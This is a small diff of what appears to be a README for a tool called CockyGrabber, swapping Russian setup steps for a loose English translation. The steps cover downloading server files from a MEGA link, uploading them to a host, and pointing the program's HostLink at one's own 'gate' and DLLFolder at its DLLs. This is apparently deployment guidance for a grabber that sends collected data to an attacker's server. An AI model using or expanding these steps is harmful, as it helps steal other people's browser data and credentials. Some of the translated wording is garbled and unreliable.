@@ -3,11 +3,11 @@
 Server and packages
 https://mega.nz/file/C7QUnAqB#ZFHkW-LGh-IU6hJkmlvcLLqECy-4vfMRR_oaHZR4oVg
 
-Закидываем все, что в server.zip на хост
+We upload everything in server.zip to the host
 
-Открываем CockyGrabber.sln
-Переходим на Program.cs
+Open CockyGrabber.sln
+Go to Program.cs
 
-В Program.cs меняем:
-HostLink на свой путь до гейта
-DLLFolder на путь до DLL-ок
+In Program.cs we change:
+HostLink on its way to the gate
+DLLFolder on the path to the DLL
